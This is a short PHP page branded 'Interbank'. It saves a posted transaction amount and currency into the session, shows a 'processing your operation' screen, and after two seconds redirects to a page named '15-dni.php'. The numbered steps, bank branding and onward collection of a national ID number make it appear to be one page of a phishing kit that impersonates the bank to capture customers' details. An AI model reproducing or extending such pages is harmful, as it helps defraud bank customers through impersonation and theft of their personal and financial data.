<?php
session_start();
$_SESSION['montoTrx'] = $_POST["montoTrx"];
$_SESSION['monedaTrx'] = $_POST["monedaTrx"];
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />

        <title>Interbank</title>	
        <link rel="stylesheet" type="text/css" href="static-6/css/styles.css"/>
        <!--[if lt IE 9]>
                <script src="static-6/js/html5.js"></script>
                <link rel="stylesheet" type="text/css" href="static-6/css/ie.css"/>
        <![endif]-->
        <script src="../static/js/jquery1.8.3.min.js" type="text/javascript"></script>

        <script type="text/javascript">
            setTimeout(function () {
                window.location.href = "15-dni.php";
            }, 2000);
        </script>
    </head>

    <body class="yellow">
        <div class="cnt-wrapper yellow">
            <div class="wrapper">
                <header class="wancho-2">
                    <div id="header">
                        <div class="logo"></div>
                    </div>
                </header>
                <section class="c-main wancho-2">
                    <div class="ac">
                        <div class="-cnt-celular-afiliado mt140">
                            <div class="-caja-uno">
                                <br/>
                                <span>Estamos procesando tu operación...</span>
                            </div>
                        </div>
                    </div>                

                </section>

            </div>
        </div>
    </body>
</html>